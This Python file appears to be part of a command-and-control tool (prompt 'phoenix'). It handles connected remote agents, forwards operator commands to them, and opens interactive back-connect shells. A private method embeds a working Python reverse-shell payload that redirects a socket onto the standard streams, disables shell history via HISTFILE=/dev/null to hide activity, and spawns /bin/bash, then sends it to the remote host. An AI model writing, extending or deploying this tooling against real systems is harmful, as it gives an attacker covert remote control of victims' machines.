#!/usr/bin/env python3

import socket, string, random, os, sys
runpath = os.path.dirname(os.path.realpath(__file__))
approot = os.path.abspath(os.path.join(runpath, os.pardir))
sys.path.append(os.path.join(runpath,'..'))
sys.path.append(approot)
import lib.shell as shell
import lib.shm as shm

class TCPClient():
    def __init__(self,conn,addr):
        self.client = conn
        self.address = addr
        self.name = self.__generate_name()
        self.interact_module = False        # Handle the modue interactive session. This is nit an interactive shell session
        self.default_receive_buffer = 8096  # The dafault buffer to receive data

    def __generate_name(self,size=8, chars=string.ascii_uppercase + string.digits):
        return ''.join(random.choice(chars) for _ in range(size))
    def get_socket(self):
        return self.client
    def interactive_shell(self):
        
        back_address = shm.addressPool.get_address() # Get address from adress pol to conenct back
        address = ('127.0.0.1',back_address) # create address tuple
        print("[*] Listening on port {port} for incoming interactive shell connection".format(port=str(back_address)))
        intshell = shell.Shell(addr=address) # set back address into shell
        intshell.handle() # handle the incoming back connect
        shm.addressPool.put_address(back_address)
        
    def teszt(self):
        self.client.send("ip a".encode())
        res = self.client.recv(4096)
        print(res.decode())
        
    def interactive_module(self):
        self.interact_module = True
        while self.interact_module:
            cmd = input(f"phoenix({self.name})> ")
            self.command_interpreter(cmd)
            
    def send(self,data):
        if type(b'a') == type(data):
            self.client.send(data)
        else:
            self.client.send(data.encode())
            
    def receive(self,length=8096):
        data = self.client.recv(length)
        return data
    
    def receive_all(self):
        recv_len = 1
        response = b''
        s = None
        while recv_len:
            data = self.client.recv(self.default_receive_buffer)
            response += data
            recv_len = len(data)
            if recv_len < self.default_receive_buffer:
                recv_len = 0
                break  
        return response
    def command_interpreter(self,command):
        if len(command) >0:
            if command in [':bg',':exit']:
                self.interact_module = False
            elif command.startswith('shell'):
                
                self.interactive_shell()
            elif command == ':terminate':
                self.client.close()
                self.interact_module = False
            elif command == 'teszt':
                self.teszt()
            else:
                self.send(command)
                data = self.receive_all()
                print(data.decode())
    def __send_back_connect(self):
        #query= "connect {addr}:{port}".format(addr=self.address[0],port=int(self.address[1]))
        python_bc = f"""
        import os
        import pty
        import socket
        
        lhost = "127.0.0.1" 
        lport = {self.address[1]}
        
        def main():
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((lhost, lport))
            os.dup2(s.fileno(),0)
            os.dup2(s.fileno(),1)
            os.dup2(s.fileno(),2)
            os.putenv("HISTFILE",'/dev/null')
            pty.spawn("/bin/bash")
            s.close()
                
        if __name__ == "__main__":
            main()

        """
        self.send(python_bc)